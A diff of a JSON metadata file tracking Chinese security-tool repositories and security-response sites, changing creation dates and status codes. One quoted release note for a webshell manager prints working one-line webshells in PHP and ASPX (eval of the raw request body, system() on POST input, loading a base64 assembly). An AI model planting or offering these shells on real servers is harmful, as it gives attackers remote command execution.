@@ -253,7 +253,7 @@
         "release_message": ""
     },
     "https://github.com/StarCrossPortal/QingTing": {
-        "created_at": "2022-04-29 02:33:43",
+        "created_at": "2022-05-12 09:41:48",
         "description": "蜻蜓安全一个安全工具编排平台,可以自由编排你的工具流,集成108款工具,包括xray、nmap、awvs等;你可以将喜欢的工具编排成一个场景，快速打造适合自己的安全工作台~",
         "commit_date": "2023-03-21 08:07:56",
         "commit_message": "reset readme.md",
@@ -2057,7 +2057,7 @@
         "release_message": "> ❗️本次更新涉及内容较多，请仔细阅读\r\n\r\n### 核心\r\n\r\n* 修复 PHP/PHP4 当前目录不可写时 bypass open_basedir 失败的 Bug\r\n* ❗️❗️❗️ 新增 PHPRAW 类型, 该类型支持的 WebShell 类似如下代码:\r\n\r\n```php\r\n<?php eval(file_get_contents(\"php://input\"));?>\r\n```\r\n\r\n> 为了方便直连 Behinder3 WebShell, 编码器已内置。\r\n\r\n* ❗️❗️❗️新增 ASPXCSharp 类型\r\n\r\n该类型支持的 WebShell 类似如下代码:\r\n\r\n```\r\n<%@ Page Language=\"c#\"%>\r\n<%\r\n  String Payload = Request.Form[\"ant\"];\r\n  if (Payload != null)\r\n  {\r\n    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));\r\n    assembly.CreateInstance(assembly.GetName().Name + \".Run\").Equals(null);\r\n  }\r\n%>\r\n```\r\n\r\n有关该类型的设计说明, 请参考[聊聊新类型ASPXCSharp](https://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/)\r\n\r\n* ❗️❗️❗️新增 PSWindows 类型，与 CMDLinux 类似\r\n\r\n> 基于命令执行的一句话类型, 仅支持 Windows 环境\r\n\r\n该类型支持的 WebShell 类似如下代码:\r\n\r\n```php\r\n<?php system($_POST[\"ant\"]);?>\r\n```\r\n\r\n有关 PSWindows 的一些注意事项和原理说明, 请参考[新类型 PSWindows 预览](https://mp.weixin.qq.com/s/tPPg4VgQH-n2O3Lnfg8lVA)\r\n\r\n* ❗️❗️❗️JSPJS 兼容各种表达式注入\r\n\r\n> 具体请看 spelbase64、el、ognl 这三个内置编码器样例, 详细请参考[Java表达式注入的武器化利用](https://mp.weixin.qq.com/s/nCvAICapO8NX--VfToLcwQ)\r\n\r\n### 数据管理\r\n\r\n* 优化了编辑 Shell 信息时，URL后缀发生改变后连动修改「连接类型」功能\r\n* 优化插件快捷设置,修正过多快捷设置后对UI影响(Fix #303)\r\n* 修复 JSP/MySQL类型在表名中有特殊字符时执行异常的 Bug (thx @powersploit)\r\n* ❗️❗️新增配置选项「Body 设置为 RAW 模式」\r\n\r\n> 勾选该选项后，只会发送 `pwd` 键下的内容，不会发送键值\r\n> 目前生效的类型有: 「PHPRAW」、「CMDLinux」、「PSWindows」、「JSPJS」\r\n\r\n主要场景如下:\r\n\r\n```\r\n// 连接类型 CMDLinux, 勾选 「Body 设置为 RAW 模式」后可连接\r\n<?php system(file_get_contents(\"php://input\"));?>\r\n```\r\n\r\n### 文件管理\r\n\r\n* ❗️新增 FileHash 计算目标文件 hash 功能\r\n\r\n> 该功能目前正在逐步适配所有类型中 , 目前已经适配 PHP/PHP4/PSWindows/CMDLinux/JSP/JSPJS\r\n\r\n### 后端模块\r\n\r\n* 支持自定义 Content-Type, 默认是 `form`\r\n\r\nsuperagent 支持的 type 简写如下, 当然也支持填写全称:\r\n\r\n```\r\nhtml: 'text/html',\r\njson: 'application/json',\r\nxml: 'text/xml',\r\nurlencoded: 'application/x-www-form-urlencoded',\r\nform: 'application/x-www-form-urlencoded',\r\nform-data: 'application/x-www-form-urlencoded'\r\n```\r\n\r\n* Fix #307\r\n* 重新规整 `modules/request.js` 代码结构\r\n* 调整 superagent `ignoreHTTPS` 注入,避免 npm upgrade之后引发问题\r\n* ❗️❗️❗️支持 WebSocket 连接\r\n\r\n> 由于 ASP/ASPX/ASPXCharp/PHP/JSP/CUSTOM 类型每次请求时为多个参数，WebSocket连接之后Server端解析会较为困难，所以当前仅支持「RAW」类型: 「PHPRAW」、「CMDLinux」、「PSWindows」、「JSPJS」,未来会支持基于 defineClass 的 JSPRAW 类型\r\n\r\n以 [wsMemShell](https://github.com/veo/wsMemShell) 项目中的 `wscmd` 为例:\r\n\r\n```\r\nURL: ws://127.0.0.1:8080/demoendpoint\r\nPWD: 随便填写\r\n连接类型: CMDLinux\r\nEncoder: default (明文, 这个是WebShell端决定的)\r\nDecoder: 根据情况自由选择\r\n```\r\n\r\n> 注意: 由于 antSword 历史设计原因，WebSocket 连接方式暂时只能每次操作都重新建立一次连接，在传输结束后自动与Server端断开\r\n\r\n\r\n### 设置模块\r\n\r\n* 优化了新增Core类型时，编码设置解析逻辑, 现在不需要再改该模块的源代码了\r\n* ❗️❗️优化全局代理设置, 代理在设置完后不需要再重启了\r\n\r\n### 其它\r\n\r\n* 更新纯真IP数据库为 2022/04/20 (https://github.com/out0fmemory/qqwry.dat)\r\n\r\n> 如需自己更新请下载后替换 `static/libs/qqwry.dat` 文件\r\n\r\n* 升级 superagent 到 6.1.0 (再高的版本需要高版本Electron支持)\r\n* 升级 superagent-proxy 到 v3.0.0\r\n"
     },
     "https://github.com/pingc0y/go_proxy_pool": {
-        "created_at": "2022-11-14 07:00:52",
+        "created_at": "2023-02-22 09:02:18",
         "description": "无环境依赖开箱即用的代理IP池",
         "commit_date": "2023-05-03 03:33:23",
         "commit_message": "Update README.md",
@@ -4773,7 +4773,7 @@
         "release_message": ""
     },
     "https://github.com/wgpsec/tig": {
-        "created_at": "2022-03-04 02:11:24",
+        "created_at": "2021-03-10 05:50:42",
         "description": "Threat Intelligence Gathering 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率。",
         "commit_date": "2023-08-10 13:58:08",
         "commit_message": "Update README.md",
@@ -22413,7 +22413,7 @@
         "release_message": "更新日志：\r\n1. 鉴权抛弃了cookie改为了JWT\r\n2. 增加了验证码\r\n3. 增加加载数据的动画\r\n4. 修复了一些小bug，如空白符导致的用户名重复\r\n5. 优化了日志存储，对登录注册记录了日志\r\n6. 前端打包的代码加了gzip静态压缩"
     },
     "https://github.com/wgpsec/YongYouNcTool": {
-        "created_at": "2023-08-19 10:10:56",
+        "created_at": "2023-08-19 10:23:27",
         "description": "用友NC系列漏洞检测利用工具，支持一键检测、命令执行回显、文件落地、一键打入内存马、文件读取等",
         "commit_date": "2023-08-19 14:50:28",
         "commit_message": "Update README.md",
@@ -24412,8 +24412,8 @@
         "description": "魅族安全中心"
     },
     "https://sec.vip.com/": {
-        "status_code": 503,
-        "description": ""
+        "status_code": 200,
+        "description": "VSRC首页-唯品会信息安全中心"
     },
     "https://sec.wacai.com/": {
         "status_code": 200,
@@ -27075,7 +27075,7 @@
     },
     "https://dns.aizhan.com/": {
         "status_code": 200,
-        "description": "20.102.210.213属于美国_IP反查域名_同IP站点查询_同ip网站查询_爱站网"
+        "description": "172.183.131.102属于美国_IP反查域名_同IP站点查询_同ip网站查询_爱站网"
     },
     "https://search.chongbuluo.com/": {
         "status_code": 200,
